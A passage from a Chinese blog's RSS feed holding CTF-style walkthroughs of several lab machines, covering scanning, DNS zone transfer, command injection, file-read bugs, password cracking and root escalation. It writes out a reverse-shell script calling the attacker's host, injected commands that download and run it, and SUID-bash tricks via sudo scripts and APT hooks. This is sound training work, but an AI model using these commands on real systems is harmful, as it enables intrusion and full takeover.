uid=1001(astro) gid=1001(astro) groups=1001(astro)
```

再根据 `sudo -l` 的权限，可以直接切换到 `root`

```bash
$ sudo -l
Matching Defaults entries for astro on 05cc10128c04:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
$ sudo su root
root@05cc10128c04:/home# 
```

我们再根据上边的文件进行网络嗅探

![image.png](/post-images/TheHackersLabsHellRoot/image11.png)

但是直接抓并不能抓到什么有用的，想起来 `Gitea` 可以进行登录

先提前开启抓包，然后在网站上个使用凭据登录

```scheme
tcpdump -i eth0 -A -w 1.pcap
```

![image.png](/post-images/TheHackersLabsHellRoot/image12.png)

然后直接查看数据包，能得到一个凭据

![image.png](/post-images/TheHackersLabsHellRoot/image13.png)

但一开始并没想到这个是密码，因为我认为这是前端传过来加密数据

然后在 `ssh` 进行密码碰撞，成功登录进去了

![image.png](/post-images/TheHackersLabsHellRoot/image14.png)

能读取到 `user.txt`

![image.png](/post-images/TheHackersLabsHellRoot/image15.png)

## 权限提升

寻找存在 `suid` 权限的程序

```scheme
astro@hellroot:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/secmonitor
/usr/local/bin/logview
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

有两个奇怪的程序 `logview` 和 `secmonitor`

`logview` 能直接读文件，直接读 `root.txt`

```scheme
astro@hellroot:~$ logview ../../root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log/../../root/root.txt
f03xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>RCE</category>
            <category>Logview</category>
        </item>
        <item>
            <title><![CDATA[群U靶机 - Cliv2]]></title>
            <link>https://www.sunsetaction.top/2025/07/31/群U靶机 - Cliv2</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/31/群U靶机 - Cliv2</guid>
            <pubDate>Thu, 31 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[群U靶机 Cliv2 Recon 端口扫描 子域名爆破 DNS 区域传输漏洞 看到 dev 就很兴奋 点进去后看到 AXFR 我一搜，能找到： DNS 区域传输 (AXFR) 使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编...]]></description>
            <content:encoded><![CDATA[
# 群U靶机 - Cliv2

## Recon

端口扫描

```scheme
➜  Test nmap -sT -min-rate 10000 -p- 192.168.56.100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:37 CST
Nmap scan report for 192.168.56.100
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

```scheme

➜  Test nmap -sT -A -p 22,80,53 192.168.56.100     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:38 CST
Nmap scan report for cliv2.dsz (192.168.56.100)
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.16.50-Debian
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: CLIv2 Main
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:EB:7B:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms cliv2.dsz (192.168.56.100)
```

子域名爆破

```scheme
➜  Test ffuf -u 'http://cliv2.dsz/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'host: FUZZ.cliv2.dsz' --fs=3669

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cliv2.dsz/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cliv2.dsz
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3669
________________________________________________

client                  [Status: 200, Size: 873, Words: 147, Lines: 42, Duration: 0ms]
dev                     [Status: 200, Size: 654, Words: 113, Lines: 34, Duration: 315ms]
```

## DNS 区域传输漏洞

看到 `dev` 就很兴奋

点进去后看到 **`AXFR`**

![image.png](/post-images/群U靶机%20-%20Cliv2/image.png)

我一搜，能找到：

> **DNS 区域传输 (`AXFR`)**
> 
> 
> 使用 AXFR 协议的 DNS 区域传输是跨 DNS 服务器复制 DNS 记录的最简单机制。为避免在多个 DNS 服务器上编辑信息的需要，您可以在一台服务器上编辑信息并使用 AXFR 将信息复制到其他服务器。但是，如果您不保护您的服务器，恶意方可能会使用 AXFR 来获取有关您所有主机的信息。
> 

那么它肯定没有保护

```scheme
➜  Test dig axfr @192.168.56.100  cliv2.dsz 

; <<>> DiG 9.20.9-1-Debian <<>> axfr @192.168.56.100 cliv2.dsz
; (1 server found)
;; global options: +cmd
cliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400
cliv2.dsz.              86400   IN      A       127.0.0.1
cliv2.dsz.              86400   IN      NS      ns1.dsz.
3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1
client.cliv2.dsz.       86400   IN      A       127.0.0.1
dev.cliv2.dsz.          86400   IN      A       127.0.0.1
ns1.cliv2.dsz.          86400   IN      A       127.0.0.1
cliv2.dsz.              86400   IN      SOA     ns1.cliv2.dsz. admin.cliv2.dsz. 2023072601 3600 900 604800 86400
;; Query time: 0 msec
;; SERVER: 192.168.56.100#53(192.168.56.100) (TCP)
;; WHEN: Thu Jul 31 18:58:51 CST 2025
;; XFR size: 8 records (messages 1, bytes 264)
```

## 反弹 shell

有命令执行功能

![image.png](/post-images/群U靶机%20-%20Cliv2/image1.png)

不能有空格限制：不允许使用空格或连字符。最大长度：64 个字符。

在 `Kali` 准备恶意文件，并开启 `HTTP` 服务器

```scheme
➜  Test cat v.sh 
#!/bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc 192.168.56.5 1234 >/tmp/f
```

通过两步来拿到 `shell`

```scheme
cmd=cd${IFS}/tmp;busybox${IFS}wget${IFS}192.168.56.5/v.sh;ls${IFS}/tmp
cmd=cd${IFS}/tmp;chmod${IFS}777${IFS}v.sh;./v.sh
```

![image.png](/post-images/群U靶机%20-%20Cliv2/image2.png)

## 权限提升

`Linpeas.sh` 发现 `bitc0de` 家目录中有一个 `…`

```scheme
╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/bitc0de/.bash_history
/home/bitc0de/...
/home/bitc0de/user.txt
/root/
/var/www
/var/www/html
/var/www/html/index.html
/var/www/cliv2.dsz
/var/www/cliv2.dsz/index.php
/var/www/3170a7.cliv2.dsz
/var/www/3170a7.cliv2.dsz/index.php
/var/www/client.cliv2.dsz
/var/www/client.cliv2.dsz/index.php
/var/www/dev.cliv2.dsz
/var/www/dev.cliv2.dsz/index.php
```

读取拿到密码

```scheme
www-data@Cliv2:/home/bitc0de$ cat ...
MabEwReOmcpG!123
```

切换到 `bitc0de` 并查看 `sudo` 权限

```scheme

bitc0de@Cliv2:~$ sudo -l
Matching Defaults entries for bitc0de on Cliv2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bitc0de may run the following commands on Cliv2:
    (ALL) NOPASSWD: /usr/local/bin/hmvcli
```

`hmvcli`是通过`python`写的

分析后发现其中有一部分代码有问题，只要参数是`config` 就会运行 `setup.sh`

```scheme
if args['config']:                              
    print("[*] Ejecutando script de configuración...")
    subprocess.run(["bash", "setup.sh"])  
    sys.exit(0) 
```

梭哈

```scheme
echo "chmod +s /bin/bash" > setup.sh
chmod +x setup.sh
sudo hmvcli --config
```

![image.png](/post-images/群U靶机%20-%20Cliv2/image3.png)


## 总结
Q裙：660930334]]></content:encoded>
            <category>靶机</category>
            <category>群U</category>
            <category>Linux</category>
            <category>DNS</category>
            <category>hvmcli</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - Merchan]]></title>
            <link>https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan</guid>
            <pubDate>Thu, 31 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Merchan https://labs.thehackerslabs.com/machine/109 Recon PortScan Web 子域名 & 目录 爆破 访问 HTTP ，这个页面什么功能点都没有 尝试爆破一下子域名，只有 www 目录爆破，能扫描出来一个 secret.js 被混淆过了...]]></description>
            <content:encoded><![CDATA[
# Merchan

> https://labs.thehackerslabs.com/machine/109
> 

![image.png](/post-images/TheHackersLabsMerchan/image.png)

## Recon

### PortScan

```bash
➜  Merchan nmap -sT -min-rate 10000 -p- 192.168.56.99
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:48 CST
Nmap scan report for 192.168.56.99
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds
```

```bash
➜  Merchan nmap -sT -A -p 22,80 192.168.56.99                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 12:49 CST
Nmap scan report for 192.168.56.99
Host is up (0.00048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 da:68:54:15:39:b8:44:ed:b9:08:4c:59:e5:89:50:08 (ECDSA)
|_  256 b4:7d:98:a8:01:e8:3b:17:43:24:43:39:3a:b4:b8:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://merchan.thl
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:1C:7F:2A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.56.99

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
```

## Web

### 子域名 & 目录 爆破

访问 `HTTP` ，这个页面什么功能点都没有

![image.png](/post-images/TheHackersLabsMerchan/image1.png)

尝试爆破一下子域名，只有 `www`

```bash
➜  Merchan ffuf -u 'http://merchan.thl/' -H 'host: FUZZ.merchan.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fw=18 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://merchan.thl/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.merchan.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

www                     [Status: 200, Size: 7235, Words: 2986, Lines: 131, Duration: 866ms]
:: Progress: [114442/114442] :: Job [1/1] :: 152 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```

目录爆破，能扫描出来一个 `secret.js`

```bash
➜  Merchan feroxbuster --url http://merchan.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x js,txt,zip
...
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      311c http://merchan.thl/images => http://merchan.thl/images/
200      GET        7l       36w      330c http://merchan.thl/js/scripts.js
200      GET    10826l    22299w   236792c http://merchan.thl/css/styles.css
301      GET        9l       28w      311c http://merchan.thl/assets => http://merchan.thl/assets/
301      GET        9l       28w      308c http://merchan.thl/css => http://merchan.thl/css/
301      GET        9l       28w      307c http://merchan.thl/js => http://merchan.thl/js/
200      GET        8l       29w    28898c http://merchan.thl/assets/favicon.ico
200      GET      563l     3920w   380306c http://merchan.thl/images/sudadera.png
200      GET      139l      592w    68236c http://merchan.thl/images/camiseta.jpg
200      GET      186l      943w    74237c http://merchan.thl/images/llavero.jpg
200      GET      130l      399w     7235c http://merchan.thl/
200      GET        1l       15w     1365c http://merchan.thl/secret.js
```

被混淆过了

![image.png](/post-images/TheHackersLabsMerchan/image2.png)

直接通过 AI 复原即可

```bash
function createLink(){
    const _0xd35862 = _0x4b23, // _0xd35862 是解码函数的别名
          _0x398463 = '2e81eb4e952a3268babddecad2a4ec1e.php',
          _0x199a7f = document[_0xd35862(0x17b)]('a');

    _0x199a7f[_0xd35862(0x17d)] = _0xd35862(0x171);
    _0x199a7f[_0xd35862(0x177)] = _0x398463;
    document[_0xd35862(0x174)][_0xd35862(0x179)](_0x199a7f);
}
_0xd35862(0x17b) -> 解码后是 'createElement'
_0xd35862(0x17d) -> 解码后是 'innerText'
_0xd35862(0x171) -> 解码后是 'Haga\x20click\x20aqui' (即 "Haga click aqui")
_0xd35862(0x177) -> 解码后是 'href'
_0xd35862(0x174) -> 解码后是 'body'
_0xd35862(0x179) -> 解码后是 'appendChild'
```

也就是会打开 `2e81eb4e952a3268babddecad2a4ec1e.php`

但是我们跳转后发现，还是会提示 `403` （任何 `php` 页面都是）

![image.png](/post-images/TheHackersLabsMerchan/image3.png)

尝试`bypass403` ，直接加上斜杠即可

![image.png](/post-images/TheHackersLabsMerchan/image4.png)

但是访问还是空白的

![image.png](/post-images/TheHackersLabsMerchan/image5.png)

### 模糊测试

我们对其进行模糊测试，首先测试任意文件读取

但是加上参数后，还是提示了 `403`

```bash
http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd
```

再次进行绕过

这里工具并无法进行绕过了

![image.png](/post-images/TheHackersLabsMerchan/image6.png)

我们进行手动绕过，最后加上 `Referer` 即可绕过

![image.png](/post-images/TheHackersLabsMerchan/image7.png)

我们再次进行

```bash
➜  Merchan ffuf -u 'http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -H 'Referer: http://merchan.thl/' --fs=0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://merchan.thl/2e81eb4e952a3268babddecad2a4ec1e.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Header           : Referer: http://merchan.thl/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 1187, Words: 27, Lines: 23, Duration: 0ms]
```

### 任意文件读取 & 密码爆破

枚举出来参数 `file`

![image.png](/post-images/TheHackersLabsMerchan/image8.png)

我们读取 `2e81eb4e952a3268babddecad2a4ec1e.php` 的源码

```bash
<?php<br />
$file = $_GET['file'] ?? '';<br />
if ($file) {<br />
echo nl2br(file_get_contents($file));<br />
}<br />
?><br />
```

到这里测试了可以使用伪协议但是不能执行语句，也不可以包含，`julia` 前 `5000` 也没爆破出来有点没思路

![image.png](/post-images/TheHackersLabsMerchan/image9.png)

看了下 `WP`，发现密码在 `rockyou` `7000`行… (PS：规则明明说爆破需要设置不超`5000`行的)

![image.png](/post-images/TheHackersLabsMerchan/image10.png)

用户家目录下读取 `user.txt`

```bash
julia@Thehackerslabs-merchan:~$ cat user.txt 
b4axxxxxxxxxxxxxxxxxxxxxxxxx
```

## 权限提升

`sudo` 权限 

```bash
julia@Thehackerslabs-merchan:~$ sudo -l
sudo: unable to resolve host Thehackerslabs-merchan: Fallo temporal en la resolución del nombre
[sudo] contraseña para julia: 
Sorry, user julia may not run sudo on Thehackerslabs-merchan.
```

上传 `linpeas`

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files 
/dev/mqueue
/dev/shm
/etc/apt/apt.conf.d
/home/julia
```

看到一个有趣的可写目录 `/etc/apt/apt.conf.d`

> https://zhuanlan.zhihu.com/p/1888937295215851002
> 

当系统运行 `apt update` 时，会加载 `/etc/apt/apt.conf.d` 文件夹的所有配置文件

```scheme
echo 'APT::Update::Pre-Invoke {"chmod +s /bin/bash"}' > a
```

过了一会之后我们再查看 `/bin/bash` 权限

![image.png](/post-images/TheHackersLabsMerchan/image11.png)

读取 `root.txt`

```scheme
bash-5.2# cat root.txt 
056e7xxxxxxxxxxxxxxxxxxxxxxxx
```]]></content:encoded>
            <category>靶机</category>
            <category>TheHackersLabs</category>
            <category>Linux</category>
            <category>APT</category>
            <category>LFI</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - HEXTHINK SILENT SHADOW]]></title>
            <link>https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW</guid>
            <pubDate>Thu, 31 Jul 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[HEXTHINK SILENT SHADOW https://labs.thehackerslabs.com/machine/110 Recon PortScan 枚举 访问 HTTP ，提示了很有意思的东西 得到数据库的用户 ctf user 连接数据库，意外的发现不用数据库 数据库里面好几个表（...]]></description>
            <content:encoded><![CDATA[
# HEXTHINK SILENT SHADOW

> https://labs.thehackerslabs.com/machine/110
> 

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image.png)

## Recon

### PortScan

```bash
➜  HEXTHINK_SILENT_SHADOW nmap -sT -min-rate 10000 -p- 192.168.56.97
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:39 CST
Nmap scan report for 192.168.56.97
Host is up (0.00038s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
9090/tcp open  zeus-admin
MAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds
```

```bash
➜  HEXTHINK_SILENT_SHADOW nmap -sT -A -p 22,80,3306,9090 192.168.56.97                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:41 CST
Nmap scan report for 192.168.56.97         
Host is up (0.00041s latency).
                                                                                                
PORT     STATE SERVICE    VERSION                                                                                                                                                               
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:        
|   256 4d:6e:39:a4:15:86:88:70:c7:9d:09:91:a3:0b:18:8c (ECDSA)
|_  256 f9:21:5d:25:ee:76:05:db:01:3b:45:c9:68:b0:82:9f (ED25519)
80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)                                                    
|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).
3306/tcp open  mysql      MariaDB 5.5.5-10.11.11 
| mysql-info:      
|   Protocol: 10         
|   Version: 5.5.5-10.11.11-MariaDB-0ubuntu0.24.04.2
|   Thread ID: 35                                                                                                                                                                               
|   Capabilities flags: 63486                                                                   
|   Some Capabilities: SupportsCompression, Support41Auth, IgnoreSpaceBeforeParenthesis, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit                                                                                                                                                                          
|   Salt: BwQo]cXnB?UoLmc(9'Wb                                                                  
|_  Auth Plugin Name: mysql_native_password
9090/tcp open  tcpwrapped     
MAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)                
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                           
Device type: general purpose                                                                    
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19                                                                   
Network Distance: 1 hop                                                                         
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                         
                                                                                                
TRACEROUTE                                                                                      
HOP RTT     ADDRESS
1   0.41 ms 192.168.56.97
                                                                                                
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                           
Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds 
```

### 枚举

访问 `HTTP` ，提示了很有意思的东西

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image1.png)

得到数据库的用户 `ctf_user`

连接数据库，意外的发现不用数据库

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image2.png)

数据库里面好几个表（账户，雇员，消息，供应商，用户），还存了一些图片

一些有趣的信息：

```bash
Buscamos pentesters sin miedo. Contacto interno: d3v@n0m41n.
//
admin	21232f297a57a5a743894a0e4a801fc3
test	098f6bcd4621d373cade4e832627b4f6
support	e99a18c428cb38d5f260853678922e03
h4cker	5f4dcc3b5aa765d61d8327deb882cf99
```

我们将用户表进行爆破

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image3.png)

```bash
➜  HEXTHINK_SILENT_SHADOW john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 users
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (h4cker)     
abc123           (support)     
admin            (admin)     
test             (test)     
4g 0:00:00:00 DONE (2025-07-30 21:54) 200.0g/s 8313Kp/s 8313Kc/s 9350KC/s tyson4..tauruz
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

目录爆破

```bash
➜  HEXTHINK_SILENT_SHADOW feroxbuster --url http://192.168.56.97/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip
                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.97/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [asp, php, txt, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        3l       38w      383c http://192.168.56.97/
200      GET      872l     4588w    76866c http://192.168.56.97/index2.php
200      GET        3l       38w      383c http://192.168.56.97/index.php
301      GET        9l       28w      319c http://192.168.56.97/javascript => http://192.168.56.97/javascript/
200      GET      872l     4588w    76849c http://192.168.56.97/info.php
301      GET        9l       28w      326c http://192.168.56.97/javascript/jquery => http://192.168.56.97/javascript/jquery/
[####################] - 3m   3114515/3114515 0s      found:7       errors:4      
[####################] - 3m   1038145/1038145 5925/s  http://192.168.56.97/ 
[####################] - 3m   1038145/1038145 5868/s  http://192.168.56.97/javascript/ 
[####################] - 3m   1038145/1038145 6569/s  http://192.168.56.97/javascript/jquery/ 
```

`index2.php` 和 `info.php` 是一样的

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image4.png)

扫描后发现，用户表中信息无用，我已经将其拿去进行爆破了，但是没有结果

然后 `notice`表中，有一个 ‘你已经走了很长一段路。但还有很长的路要走……’，并附上了一张照片

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image5.png)

我们将照片保存下来，格式是 `JPG`

![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image6.png)

我们尝试提取信息

```bash
➜  HEXTHINK_SILENT_SHADOW binwalk -Me --run-as=root 2.jpg    

Scan Time:     2025-07-30 22:34:11
Target File:   /root/Desktop/TheHackersLabs/HEXTHINK_SILENT_SHADOW/2.jpg
MD5 Checksum:  1576b20a92fe6ac42b11889e1f790aa1
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

➜  HEXTHINK_SILENT_SHADOW stegseek 2.jpg            
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "hello"
[i] Original filename: "instrucciones.txt".
[i] Extracting to "2.jpg.out".
```

最后使用 `StegSeek` 能获取到东西

```bash
➜  HEXTHINK_SILENT_SHADOW cat 2.jpg.out                 
Para continuar deberás abrir el Puerto 9090

Esto no es un escaneo Es un saludo

Envía la siguiente cadena al puerto 9090:

LOGIN whisper
KEY whisper9090

No lo hagas mal Solo hay una oportunidad
```

让我将其发送到 `9090`，并且只有一次机会

```bash
➜  HEXTHINK_SILENT_SHADOW echo "LOGIN whisper\nKEY whisper9090" | nc 192.168.56.97 9090
Usuario SSH: whisper
Contraseña: 7h3m1nDf0x
```

发送后得到一组账户凭据

我们进行 `SSH` 登录，拿 `user.txt`

```bash
whisper@server:~$ cat user.txt 
THL{8axxxxxxxxxxxxxx
```

## 权限提升

`sudo` 权限

```bash
whisper@server:~$ sudo -l
Matching Defaults entries for whisper on server:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User whisper may run the following commands on server:
    (ALL) NOPASSWD: /usr/bin/python3
```

梭哈

```bash
